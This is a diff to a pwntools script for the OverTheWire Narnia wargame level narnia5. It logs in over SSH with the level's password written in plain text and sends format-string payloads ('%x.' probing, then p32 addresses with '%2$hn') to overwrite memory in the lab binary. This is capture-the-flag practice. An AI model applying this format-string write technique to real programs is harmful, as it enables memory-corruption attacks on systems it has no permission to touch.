@@ -14,4 +14,10 @@ Try it outside gdb
 con = ssh('narnia5', 'narnia.labs.overthewire.org', password='faimahchiy', port=2226)
 # The problem is a null byte in the address, so you can't just send it to the program...
 # You need some way to write
-i_addr_int = int(0xffffdb00)
+p = con.process(['/narnia/narnia5', "A"* 4 + "%x."])
+print(p.recv())
+# Okay,I gave up on it
+# I don't know how to exploit it in a normal way.
+i_addr_int = int(0xffffdb11)
+p = con.process(['/narnia/narnia5', p32(i_addr_int - 0x2) + p32(i_addr_int) + b"A" * 496 + b"%2$hn"])
+print(p.recv())
